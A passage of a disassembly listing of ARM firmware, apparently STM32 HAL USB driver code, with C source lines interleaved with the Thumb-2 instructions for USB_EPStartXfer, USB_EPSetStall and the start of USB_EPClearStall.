 8007f80:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f84:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f88:	681b      	ldr	r3, [r3, #0]
 8007f8a:	691b      	ldr	r3, [r3, #16]
 8007f8c:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 8007f90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f94:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f98:	681b      	ldr	r3, [r3, #0]
 8007f9a:	699a      	ldr	r2, [r3, #24]
 8007f9c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007fa0:	1ad2      	subs	r2, r2, r3
 8007fa2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fa6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007faa:	681b      	ldr	r3, [r3, #0]
 8007fac:	619a      	str	r2, [r3, #24]
 8007fae:	e00e      	b.n	8007fce <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 8007fb0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fb4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fb8:	681b      	ldr	r3, [r3, #0]
 8007fba:	699b      	ldr	r3, [r3, #24]
 8007fbc:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 8007fc0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fc4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fc8:	681b      	ldr	r3, [r3, #0]
 8007fca:	2200      	movs	r2, #0
 8007fcc:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 8007fce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fd2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fd6:	681b      	ldr	r3, [r3, #0]
 8007fd8:	785b      	ldrb	r3, [r3, #1]
 8007fda:	2b00      	cmp	r3, #0
 8007fdc:	f040 8085 	bne.w	80080ea <USB_EPStartXfer+0x14fc>
 8007fe0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007fe4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007fe8:	681b      	ldr	r3, [r3, #0]
 8007fea:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007fee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ff2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007ff6:	681b      	ldr	r3, [r3, #0]
 8007ff8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007ffc:	b29b      	uxth	r3, r3
 8007ffe:	461a      	mov	r2, r3
 8008000:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8008004:	4413      	add	r3, r2
 8008006:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 800800a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800800e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008012:	681b      	ldr	r3, [r3, #0]
 8008014:	781b      	ldrb	r3, [r3, #0]
 8008016:	00da      	lsls	r2, r3, #3
 8008018:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 800801c:	4413      	add	r3, r2
 800801e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8008022:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 8008026:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 800802a:	881b      	ldrh	r3, [r3, #0]
 800802c:	b29b      	uxth	r3, r3
 800802e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8008032:	b29a      	uxth	r2, r3
 8008034:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8008038:	801a      	strh	r2, [r3, #0]
 800803a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800803e:	2b3e      	cmp	r3, #62	; 0x3e
 8008040:	d923      	bls.n	800808a <USB_EPStartXfer+0x149c>
 8008042:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008046:	095b      	lsrs	r3, r3, #5
 8008048:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 800804c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008050:	f003 031f 	and.w	r3, r3, #31
 8008054:	2b00      	cmp	r3, #0
 8008056:	d104      	bne.n	8008062 <USB_EPStartXfer+0x1474>
 8008058:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 800805c:	3b01      	subs	r3, #1
 800805e:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8008062:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8008066:	881b      	ldrh	r3, [r3, #0]
 8008068:	b29a      	uxth	r2, r3
 800806a:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 800806e:	b29b      	uxth	r3, r3
 8008070:	029b      	lsls	r3, r3, #10
 8008072:	b29b      	uxth	r3, r3
 8008074:	4313      	orrs	r3, r2
 8008076:	b29b      	uxth	r3, r3
 8008078:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800807c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8008080:	b29a      	uxth	r2, r3
 8008082:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8008086:	801a      	strh	r2, [r3, #0]
 8008088:	e060      	b.n	800814c <USB_EPStartXfer+0x155e>
 800808a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800808e:	2b00      	cmp	r3, #0
 8008090:	d10c      	bne.n	80080ac <USB_EPStartXfer+0x14be>
 8008092:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8008096:	881b      	ldrh	r3, [r3, #0]
 8008098:	b29b      	uxth	r3, r3
 800809a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800809e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80080a2:	b29a      	uxth	r2, r3
 80080a4:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080a8:	801a      	strh	r2, [r3, #0]
 80080aa:	e04f      	b.n	800814c <USB_EPStartXfer+0x155e>
 80080ac:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080b0:	085b      	lsrs	r3, r3, #1
 80080b2:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 80080b6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80080ba:	f003 0301 	and.w	r3, r3, #1
 80080be:	2b00      	cmp	r3, #0
 80080c0:	d004      	beq.n	80080cc <USB_EPStartXfer+0x14de>
 80080c2:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 80080c6:	3301      	adds	r3, #1
 80080c8:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 80080cc:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080d0:	881b      	ldrh	r3, [r3, #0]
 80080d2:	b29a      	uxth	r2, r3
 80080d4:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 80080d8:	b29b      	uxth	r3, r3
 80080da:	029b      	lsls	r3, r3, #10
 80080dc:	b29b      	uxth	r3, r3
 80080de:	4313      	orrs	r3, r2
 80080e0:	b29a      	uxth	r2, r3
 80080e2:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 80080e6:	801a      	strh	r2, [r3, #0]
 80080e8:	e030      	b.n	800814c <USB_EPStartXfer+0x155e>
 80080ea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080ee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80080f2:	681b      	ldr	r3, [r3, #0]
 80080f4:	785b      	ldrb	r3, [r3, #1]
 80080f6:	2b01      	cmp	r3, #1
 80080f8:	d128      	bne.n	800814c <USB_EPStartXfer+0x155e>
 80080fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80080fe:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008102:	681b      	ldr	r3, [r3, #0]
 8008104:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8008108:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800810c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008110:	681b      	ldr	r3, [r3, #0]
 8008112:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008116:	b29b      	uxth	r3, r3
 8008118:	461a      	mov	r2, r3
 800811a:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 800811e:	4413      	add	r3, r2
 8008120:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8008124:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008128:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800812c:	681b      	ldr	r3, [r3, #0]
 800812e:	781b      	ldrb	r3, [r3, #0]
 8008130:	00da      	lsls	r2, r3, #3
 8008132:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8008136:	4413      	add	r3, r2
 8008138:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800813c:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 8008140:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008144:	b29a      	uxth	r2, r3
 8008146:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 800814a:	801a      	strh	r2, [r3, #0]
 800814c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008150:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008154:	681b      	ldr	r3, [r3, #0]
 8008156:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 800815a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800815e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008162:	681b      	ldr	r3, [r3, #0]
 8008164:	785b      	ldrb	r3, [r3, #1]
 8008166:	2b00      	cmp	r3, #0
 8008168:	f040 8085 	bne.w	8008276 <USB_EPStartXfer+0x1688>
 800816c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008170:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008174:	681b      	ldr	r3, [r3, #0]
 8008176:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 800817a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800817e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8008182:	681b      	ldr	r3, [r3, #0]
 8008184:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008188:	b29b      	uxth	r3, r3
 800818a:	461a      	mov	r2, r3
 800818c:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8008190:	4413      	add	r3, r2
 8008192:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8008196:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800819a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800819e:	681b      	ldr	r3, [r3, #0]
 80081a0:	781b      	ldrb	r3, [r3, #0]
 80081a2:	00da      	lsls	r2, r3, #3
 80081a4:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 80081a8:	4413      	add	r3, r2
 80081aa:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80081ae:	f8c7 30b8 	str.w	r3, [r7, #184]	; 0xb8
 80081b2:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80081b6:	881b      	ldrh	r3, [r3, #0]
 80081b8:	b29b      	uxth	r3, r3
 80081ba:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80081be:	b29a      	uxth	r2, r3
 80081c0:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80081c4:	801a      	strh	r2, [r3, #0]
 80081c6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80081ca:	2b3e      	cmp	r3, #62	; 0x3e
 80081cc:	d923      	bls.n	8008216 <USB_EPStartXfer+0x1628>
 80081ce:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80081d2:	095b      	lsrs	r3, r3, #5
 80081d4:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80081d8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80081dc:	f003 031f 	and.w	r3, r3, #31
 80081e0:	2b00      	cmp	r3, #0
 80081e2:	d104      	bne.n	80081ee <USB_EPStartXfer+0x1600>
 80081e4:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80081e8:	3b01      	subs	r3, #1
 80081ea:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 80081ee:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 80081f2:	881b      	ldrh	r3, [r3, #0]
 80081f4:	b29a      	uxth	r2, r3
 80081f6:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 80081fa:	b29b      	uxth	r3, r3
 80081fc:	029b      	lsls	r3, r3, #10
 80081fe:	b29b      	uxth	r3, r3
 8008200:	4313      	orrs	r3, r2
 8008202:	b29b      	uxth	r3, r3
 8008204:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8008208:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800820c:	b29a      	uxth	r2, r3
 800820e:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008212:	801a      	strh	r2, [r3, #0]
 8008214:	e05c      	b.n	80082d0 <USB_EPStartXfer+0x16e2>
 8008216:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800821a:	2b00      	cmp	r3, #0
 800821c:	d10c      	bne.n	8008238 <USB_EPStartXfer+0x164a>
 800821e:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008222:	881b      	ldrh	r3, [r3, #0]
 8008224:	b29b      	uxth	r3, r3
 8008226:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800822a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800822e:	b29a      	uxth	r2, r3
 8008230:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008234:	801a      	strh	r2, [r3, #0]
 8008236:	e04b      	b.n	80082d0 <USB_EPStartXfer+0x16e2>
 8008238:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800823c:	085b      	lsrs	r3, r3, #1
 800823e:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008242:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8008246:	f003 0301 	and.w	r3, r3, #1
 800824a:	2b00      	cmp	r3, #0
 800824c:	d004      	beq.n	8008258 <USB_EPStartXfer+0x166a>
 800824e:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008252:	3301      	adds	r3, #1
 8008254:	f8c7 30d8 	str.w	r3, [r7, #216]	; 0xd8
 8008258:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 800825c:	881b      	ldrh	r3, [r3, #0]
 800825e:	b29a      	uxth	r2, r3
 8008260:	f8d7 30d8 	ldr.w	r3, [r7, #216]	; 0xd8
 8008264:	b29b      	uxth	r3, r3
 8008266:	029b      	lsls	r3, r3, #10
 8008268:	b29b      	uxth	r3, r3
 800826a:	4313      	orrs	r3, r2
 800826c:	b29a      	uxth	r2, r3
 800826e:	f8d7 30b8 	ldr.w	r3, [r7, #184]	; 0xb8
 8008272:	801a      	strh	r2, [r3, #0]
 8008274:	e02c      	b.n	80082d0 <USB_EPStartXfer+0x16e2>
 8008276:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800827a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800827e:	681b      	ldr	r3, [r3, #0]
 8008280:	785b      	ldrb	r3, [r3, #1]
 8008282:	2b01      	cmp	r3, #1
 8008284:	d124      	bne.n	80082d0 <USB_EPStartXfer+0x16e2>
 8008286:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800828a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800828e:	681b      	ldr	r3, [r3, #0]
 8008290:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8008294:	b29b      	uxth	r3, r3
 8008296:	461a      	mov	r2, r3
 8008298:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 800829c:	4413      	add	r3, r2
 800829e:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 80082a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80082a6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80082aa:	681b      	ldr	r3, [r3, #0]
 80082ac:	781b      	ldrb	r3, [r3, #0]
 80082ae:	00da      	lsls	r2, r3, #3
 80082b0:	f8d7 30c4 	ldr.w	r3, [r7, #196]	; 0xc4
 80082b4:	4413      	add	r3, r2
 80082b6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80082ba:	f8c7 30c0 	str.w	r3, [r7, #192]	; 0xc0
 80082be:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80082c2:	b29a      	uxth	r2, r3
 80082c4:	f8d7 30c0 	ldr.w	r3, [r7, #192]	; 0xc0
 80082c8:	801a      	strh	r2, [r3, #0]
 80082ca:	e001      	b.n	80082d0 <USB_EPStartXfer+0x16e2>
      }
      else
      {
        return HAL_ERROR;
 80082cc:	2301      	movs	r3, #1
 80082ce:	e03a      	b.n	8008346 <USB_EPStartXfer+0x1758>
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 80082d0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80082d4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80082d8:	681a      	ldr	r2, [r3, #0]
 80082da:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80082de:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80082e2:	681b      	ldr	r3, [r3, #0]
 80082e4:	781b      	ldrb	r3, [r3, #0]
 80082e6:	009b      	lsls	r3, r3, #2
 80082e8:	4413      	add	r3, r2
 80082ea:	881b      	ldrh	r3, [r3, #0]
 80082ec:	b29b      	uxth	r3, r3
 80082ee:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80082f2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80082f6:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80082fa:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80082fe:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8008302:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008306:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 800830a:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800830e:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 8008312:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008316:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800831a:	681a      	ldr	r2, [r3, #0]
 800831c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8008320:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8008324:	681b      	ldr	r3, [r3, #0]
 8008326:	781b      	ldrb	r3, [r3, #0]
 8008328:	009b      	lsls	r3, r3, #2
 800832a:	441a      	add	r2, r3
 800832c:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 8008330:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008334:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008338:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800833c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8008340:	b29b      	uxth	r3, r3
 8008342:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 8008344:	2300      	movs	r3, #0
}
 8008346:	4618      	mov	r0, r3
 8008348:	f507 7784 	add.w	r7, r7, #264	; 0x108
 800834c:	46bd      	mov	sp, r7
 800834e:	bd80      	pop	{r7, pc}

08008350 <USB_EPSetStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPSetStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8008350:	b480      	push	{r7}
 8008352:	b085      	sub	sp, #20
 8008354:	af00      	add	r7, sp, #0
 8008356:	6078      	str	r0, [r7, #4]
 8008358:	6039      	str	r1, [r7, #0]
  if (ep->is_in != 0U)
 800835a:	683b      	ldr	r3, [r7, #0]
 800835c:	785b      	ldrb	r3, [r3, #1]
 800835e:	2b00      	cmp	r3, #0
 8008360:	d020      	beq.n	80083a4 <USB_EPSetStall+0x54>
  {
    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_STALL);
 8008362:	687a      	ldr	r2, [r7, #4]
 8008364:	683b      	ldr	r3, [r7, #0]
 8008366:	781b      	ldrb	r3, [r3, #0]
 8008368:	009b      	lsls	r3, r3, #2
 800836a:	4413      	add	r3, r2
 800836c:	881b      	ldrh	r3, [r3, #0]
 800836e:	b29b      	uxth	r3, r3
 8008370:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008374:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8008378:	81bb      	strh	r3, [r7, #12]
 800837a:	89bb      	ldrh	r3, [r7, #12]
 800837c:	f083 0310 	eor.w	r3, r3, #16
 8008380:	81bb      	strh	r3, [r7, #12]
 8008382:	687a      	ldr	r2, [r7, #4]
 8008384:	683b      	ldr	r3, [r7, #0]
 8008386:	781b      	ldrb	r3, [r3, #0]
 8008388:	009b      	lsls	r3, r3, #2
 800838a:	441a      	add	r2, r3
 800838c:	89bb      	ldrh	r3, [r7, #12]
 800838e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008392:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008396:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800839a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800839e:	b29b      	uxth	r3, r3
 80083a0:	8013      	strh	r3, [r2, #0]
 80083a2:	e01f      	b.n	80083e4 <USB_EPSetStall+0x94>
  }
  else
  {
    PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_STALL);
 80083a4:	687a      	ldr	r2, [r7, #4]
 80083a6:	683b      	ldr	r3, [r7, #0]
 80083a8:	781b      	ldrb	r3, [r3, #0]
 80083aa:	009b      	lsls	r3, r3, #2
 80083ac:	4413      	add	r3, r2
 80083ae:	881b      	ldrh	r3, [r3, #0]
 80083b0:	b29b      	uxth	r3, r3
 80083b2:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80083b6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80083ba:	81fb      	strh	r3, [r7, #14]
 80083bc:	89fb      	ldrh	r3, [r7, #14]
 80083be:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80083c2:	81fb      	strh	r3, [r7, #14]
 80083c4:	687a      	ldr	r2, [r7, #4]
 80083c6:	683b      	ldr	r3, [r7, #0]
 80083c8:	781b      	ldrb	r3, [r3, #0]
 80083ca:	009b      	lsls	r3, r3, #2
 80083cc:	441a      	add	r2, r3
 80083ce:	89fb      	ldrh	r3, [r7, #14]
 80083d0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80083d4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80083d8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80083dc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80083e0:	b29b      	uxth	r3, r3
 80083e2:	8013      	strh	r3, [r2, #0]
  }

  return HAL_OK;
 80083e4:	2300      	movs	r3, #0
}
 80083e6:	4618      	mov	r0, r3
 80083e8:	3714      	adds	r7, #20
 80083ea:	46bd      	mov	sp, r7
 80083ec:	f85d 7b04 	ldr.w	r7, [sp], #4
 80083f0:	4770      	bx	lr

080083f2 <USB_EPClearStall>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPClearStall(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80083f2:	b480      	push	{r7}
 80083f4:	b087      	sub	sp, #28
 80083f6:	af00      	add	r7, sp, #0
 80083f8:	6078      	str	r0, [r7, #4]
 80083fa:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 80083fc:	683b      	ldr	r3, [r7, #0]
 80083fe:	7b1b      	ldrb	r3, [r3, #12]
 8008400:	2b00      	cmp	r3, #0
 8008402:	f040 809d 	bne.w	8008540 <USB_EPClearStall+0x14e>
  {
    if (ep->is_in != 0U)
 8008406:	683b      	ldr	r3, [r7, #0]
 8008408:	785b      	ldrb	r3, [r3, #1]
 800840a:	2b00      	cmp	r3, #0
 800840c:	d04c      	beq.n	80084a8 <USB_EPClearStall+0xb6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800840e:	687a      	ldr	r2, [r7, #4]
 8008410:	683b      	ldr	r3, [r7, #0]
 8008412:	781b      	ldrb	r3, [r3, #0]
 8008414:	009b      	lsls	r3, r3, #2
 8008416:	4413      	add	r3, r2
 8008418:	881b      	ldrh	r3, [r3, #0]
 800841a:	823b      	strh	r3, [r7, #16]
 800841c:	8a3b      	ldrh	r3, [r7, #16]
 800841e:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8008422:	2b00      	cmp	r3, #0
 8008424:	d01b      	beq.n	800845e <USB_EPClearStall+0x6c>
 8008426:	687a      	ldr	r2, [r7, #4]
 8008428:	683b      	ldr	r3, [r7, #0]
 800842a:	781b      	ldrb	r3, [r3, #0]
 800842c:	009b      	lsls	r3, r3, #2
 800842e:	4413      	add	r3, r2
 8008430:	881b      	ldrh	r3, [r3, #0]
 8008432:	b29b      	uxth	r3, r3
 8008434:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008438:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800843c:	81fb      	strh	r3, [r7, #14]
 800843e:	687a      	ldr	r2, [r7, #4]
 8008440:	683b      	ldr	r3, [r7, #0]
 8008442:	781b      	ldrb	r3, [r3, #0]
 8008444:	009b      	lsls	r3, r3, #2
 8008446:	441a      	add	r2, r3
 8008448:	89fb      	ldrh	r3, [r7, #14]
 800844a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800844e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8008452:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8008456:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800845a:	b29b      	uxth	r3, r3
 800845c:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 800845e:	683b      	ldr	r3, [r7, #0]
 8008460:	78db      	ldrb	r3, [r3, #3]
 8008462:	2b01      	cmp	r3, #1
 8008464:	d06c      	beq.n	8008540 <USB_EPClearStall+0x14e>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 8008466:	687a      	ldr	r2, [r7, #4]
 8008468:	683b      	ldr	r3, [r7, #0]
 800846a:	781b      	ldrb	r3, [r3, #0]
 800846c:	009b      	lsls	r3, r3, #2
 800846e:	4413      	add	r3, r2
 8008470:	881b      	ldrh	r3, [r3, #0]
 8008472:	b29b      	uxth	r3, r3
 8008474:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8008478:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800847c:	81bb      	strh	r3, [r7, #12]
 800847e:	89bb      	ldrh	r3, [r7, #12]
 8008480:	f083 0320 	eor.w	r3, r3, #32
 8008484:	81bb      	strh	r3, [r7, #12]
 8008486:	687a      	ldr	r2, [r7, #4]
 8008488:	683b      	ldr	r3, [r7, #0]
 800848a:	781b      	ldrb	r3, [r3, #0]
 800848c:	009b      	lsls	r3, r3, #2
 800848e:	441a      	add	r2, r3
 8008490:	89bb      	ldrh	r3, [r7, #12]
 8008492:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8008496:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800849a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800849e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80084a2:	b29b      	uxth	r3, r3
 80084a4:	8013      	strh	r3, [r2, #0]
 80084a6:	e04b      	b.n	8008540 <USB_EPClearStall+0x14e>
      }
    }
    else
    {
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80084a8:	687a      	ldr	r2, [r7, #4]
 80084aa:	683b      	ldr	r3, [r7, #0]
 80084ac:	781b      	ldrb	r3, [r3, #0]
 80084ae:	009b      	lsls	r3, r3, #2
 80084b0:	4413      	add	r3, r2
 80084b2:	881b      	ldrh	r3, [r3, #0]
 80084b4:	82fb      	strh	r3, [r7, #22]
 80084b6:	8afb      	ldrh	r3, [r7, #22]
 80084b8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80084bc:	2b00      	cmp	r3, #0
 80084be:	d01b      	beq.n	80084f8 <USB_EPClearStall+0x106>
 80084c0:	687a      	ldr	r2, [r7, #4]
 80084c2:	683b      	ldr	r3, [r7, #0]
 80084c4:	781b      	ldrb	r3, [r3, #0]
 80084c6:	009b      	lsls	r3, r3, #2
 80084c8:	4413      	add	r3, r2
 80084ca:	881b      	ldrh	r3, [r3, #0]
